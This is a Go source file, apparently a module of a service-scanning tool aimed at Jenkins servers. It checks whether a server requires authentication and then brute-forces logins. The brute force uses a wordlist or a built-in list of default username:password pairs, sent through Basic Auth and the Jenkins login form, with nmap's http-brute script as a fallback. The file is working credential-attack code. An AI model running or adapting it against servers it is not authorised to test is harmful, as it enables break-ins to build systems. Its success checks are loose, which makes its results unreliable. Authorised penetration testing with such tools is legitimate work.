package actions

import (
	"fmt"
	"net/http"
	"strings"
)

// JenkinsAction implements Jenkins service scanning
type JenkinsAction struct {
	BaseAction
}

// NewJenkinsAction creates a new Jenkins action
func NewJenkinsAction() *JenkinsAction {
	return &JenkinsAction{
		BaseAction: *NewBaseAction(),
	}
}

// CheckAuth checks if Jenkins requires authentication
func (j *JenkinsAction) CheckAuth() (bool, string, error) {
	// First check if port is open
	open, err := j.CheckPort(j.Host, j.Port)
	if err != nil {
		return false, "", err
	}
	if !open {
		return false, "Port closed", nil
	}

	// Create HTTP client with timeout
	client := &http.Client{
		Timeout: j.Timeout,
	}

	// Try to access Jenkins endpoints
	endpoints := []string{
		"/",
		"/login",
		"/api/json",
		"/manage",
	}

	var requiresAuth bool
	var info string

	for _, endpoint := range endpoints {
		url := fmt.Sprintf("http://%s:%d%s", j.Host, j.Port, endpoint)
		resp, err := client.Get(url)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		// Check for basic auth
		if resp.StatusCode == http.StatusUnauthorized {
			authHeader := resp.Header.Get("WWW-Authenticate")
			if strings.Contains(strings.ToLower(authHeader), "basic") {
				requiresAuth = true
				info = "HTTP Basic Authentication required"
				break
			}
		}

		// Check for Jenkins login page
		if resp.StatusCode == http.StatusOK {
			contentType := resp.Header.Get("Content-Type")
			if strings.Contains(contentType, "text/html") {
				// Check response body for login indicators
				if strings.Contains(resp.Header.Get("Set-Cookie"), "JSESSIONID") ||
					strings.Contains(resp.Header.Get("Set-Cookie"), "jenkins") {
					requiresAuth = true
					info = "Jenkins login page detected"
					break
				}
			}
		}
	}

	// If no auth detected through HTTP, try nmap script
	if !requiresAuth {
		output, err := j.RunNmapScript(j.Host, j.Port, "http-auth-finder")
		if err != nil {
			return false, "", err
		}

		// Check if authentication is required
		requiresAuth = strings.Contains(output, "authentication required") ||
			strings.Contains(output, "login required") ||
			strings.Contains(output, "Jenkins login")

		if requiresAuth {
			info = output
		}
	}

	return requiresAuth, info, nil
}

// BruteForce attempts to brute force Jenkins credentials
func (j *JenkinsAction) BruteForce() (bool, string, error) {
	// Try to read from service-specific wordlist first
	credentials, err := j.ReadServiceWordlist("jenkins")
	if err != nil {
		// Fall back to default credentials if wordlist is not available
		credentials = []string{
			"admin:admin",
			"admin:password",
			"admin:jenkins",
			"jenkins:jenkins",
			"jenkins:password",
			"root:root",
			"root:password",
		}
	}

	// Create HTTP client with timeout
	client := &http.Client{
		Timeout: j.Timeout,
	}

	var success bool
	var successInfo string

	for _, cred := range credentials {
		parts := strings.Split(cred, ":")
		if len(parts) != 2 {
			continue
		}

		username, password := parts[0], parts[1]

		// Try basic auth first
		url := fmt.Sprintf("http://%s:%d/api/json", j.Host, j.Port)
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}

		req.SetBasicAuth(username, password)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			success = true
			successInfo = fmt.Sprintf("Successfully authenticated with username: %s, password: %s using Basic Auth", username, password)
			break
		}

		// Try Jenkins login page
		url = fmt.Sprintf("http://%s:%d/j_acegi_security_check", j.Host, j.Port)
		formData := fmt.Sprintf("j_username=%s&j_password=%s&from=/&Submit=Sign+in", username, password)
		req, err = http.NewRequest("POST", url, strings.NewReader(formData))
		if err != nil {
			continue
		}

		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err = client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		// Check for successful login
		if resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusOK {
			// Check for session cookie
			if strings.Contains(resp.Header.Get("Set-Cookie"), "JSESSIONID") {
				success = true
				successInfo = fmt.Sprintf("Successfully authenticated with username: %s, password: %s using Jenkins login", username, password)
				break
			}
		}
	}

	if !success {
		// Try nmap script as fallback
		output, err := j.RunNmapScript(j.Host, j.Port, "http-brute")
		if err != nil {
			return false, "", err
		}

		success = strings.Contains(output, "Valid credentials") ||
			strings.Contains(output, "Login successful")

		if success {
			successInfo = output
		}
	}

	return success, successInfo, nil
}
